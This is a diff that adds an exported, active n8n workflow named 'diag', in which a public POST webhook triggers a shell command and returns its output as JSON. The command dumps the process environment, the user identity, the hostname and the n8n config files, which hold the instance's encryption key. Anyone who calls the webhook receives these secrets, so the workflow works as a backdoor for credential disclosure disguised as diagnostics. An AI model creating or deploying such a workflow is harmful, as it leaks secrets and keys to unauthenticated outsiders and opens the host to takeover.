@@ -1,0 +1,180 @@
+{
+  "active": true,
+  "activeVersion": {
+    "updatedAt": "2026-11-26T19:48:37.903Z",
+    "createdAt": "2026-11-26T19:48:37.903Z",
+    "versionId": "c2de93cd-dc18-4273-b734-270c16d9e7b3",
+    "workflowId": "GAnwjbcaNrKdccUE",
+    "nodes": [
+      {
+        "parameters": {
+          "httpMethod": "POST",
+          "path": "diagmnr776z0",
+          "responseMode": "responseNode",
+          "options": {}
+        },
+        "id": "n1",
+        "name": "Webhook",
+        "type": "n8n-nodes-base.webhook",
+        "typeVersion": 2,
+        "position": [
+          0,
+          0
+        ],
+        "webhookId": "diagmnr776z0"
+      },
+      {
+        "parameters": {
+          "command": "echo ===ID===; id; echo ===HOSTNAME===; hostname; echo ===ENVIRON===; cat /proc/self/environ | tr '\\0' '\\n' | sort; echo ===ENVCMD===; env | sort; echo ===CONFIG===; cat /home/node/.n8n/config 2>/dev/null; cat /root/.n8n/config 2>/dev/null; echo ===LS===; ls -la /home/node/.n8n/ 2>/dev/null; ls -la /root/.n8n/ 2>/dev/null; echo ===PWD===; pwd; whoami"
+        },
+        "id": "n2",
+        "name": "Exec",
+        "type": "n8n-nodes-base.executeCommand",
+        "typeVersion": 1,
+        "position": [
+          220,
+          0
+        ]
+      },
+      {
+        "parameters": {
+          "respondWith": "json",
+          "responseBody": "={{ JSON.stringify($json) }}",
+          "options": {}
+        },
+        "id": "n3",
+        "name": "Respond",
+        "type": "n8n-nodes-base.respondToWebhook",
+        "typeVersion": 1,
+        "position": [
+          440,
+          0
+        ]
+      }
+    ],
+    "connections": {
+      "Webhook": {
+        "main": [
+          [
+            {
+              "node": "Exec",
+              "type": "main",
+              "index": 0
+            }
+          ]
+        ]
+      },
+      "Exec": {
+        "main": [
+          [
+            {
+              "node": "Respond",
+              "type": "main",
+              "index": 0
+            }
+          ]
+        ]
+      }
+    },
+    "authors": "Matheus Cristhyan",
+    "name": null,
+    "description": null
+  },
+  "activeVersionId": "c2de93cd-dc18-4273-b734-270c16d9e7b3",
+  "connections": {
+    "Webhook": {
+      "main": [
+        [
+          {
+            "node": "Exec",
+            "type": "main",
+            "index": 0
+          }
+        ]
+      ]
+    },
+    "Exec": {
+      "main": [
+        [
+          {
+            "node": "Respond",
+            "type": "main",
+            "index": 0
+          }
+        ]
+      ]
+    }
+  },
+  "createdAt": "2026-11-26T19:48:37.594Z",
+  "id": "GAnwjbcaNrKdccUE",
+  "isArchived": false,
+  "meta": null,
+  "name": "diag-diagmnr776z0",
+  "nodes": [
+    {
+      "parameters": {
+        "httpMethod": "POST",
+        "path": "diagmnr776z0",
+        "responseMode": "responseNode",
+        "options": {}
+      },
+      "id": "n1",
+      "name": "Webhook",
+      "type": "n8n-nodes-base.webhook",
+      "typeVersion": 2,
+      "position": [
+        0,
+        0
+      ],
+      "webhookId": "diagmnr776z0"
+    },
+    {
+      "parameters": {
+        "command": "echo ===ID===; id; echo ===HOSTNAME===; hostname; echo ===ENVIRON===; cat /proc/self/environ | tr '\\0' '\\n' | sort; echo ===ENVCMD===; env | sort; echo ===CONFIG===; cat /home/node/.n8n/config 2>/dev/null; cat /root/.n8n/config 2>/dev/null; echo ===LS===; ls -la /home/node/.n8n/ 2>/dev/null; ls -la /root/.n8n/ 2>/dev/null; echo ===PWD===; pwd; whoami"
+      },
+      "id": "n2",
+      "name": "Exec",
+      "type": "n8n-nodes-base.executeCommand",
+      "typeVersion": 1,
+      "position": [
+        220,
+        0
+      ]
+    },
+    {
+      "parameters": {
+        "respondWith": "json",
+        "responseBody": "={{ JSON.stringify($json) }}",
+        "options": {}
+      },
+      "id": "n3",
+      "name": "Respond",
+      "type": "n8n-nodes-base.respondToWebhook",
+      "typeVersion": 1,
+      "position": [
+        440,
+        0
+      ]
+    }
+  ],
+  "pinData": null,
+  "settings": {
+    "executionOrder": "v1",
+    "callerPolicy": "workflowsFromSameOwner",
+    "availableInMCP": false
+  },
+  "shared": [
+    {
+      "updatedAt": "2026-11-26T19:48:37.594Z",
+      "createdAt": "2026-11-26T19:48:37.594Z",
+      "role": "workflow:owner",
+      "workflowId": "GAnwjbcaNrKdccUE",
+      "projectId": "AxNpta0sA2v4gJ2a"
+    }
+  ],
+  "staticData": null,
+  "tags": [],
+  "triggerCount": 1,
+  "updatedAt": "2026-11-26T19:48:37.594Z",
+  "versionId": "c2de93cd-dc18-4273-b734-270c16d9e7b3"
+}
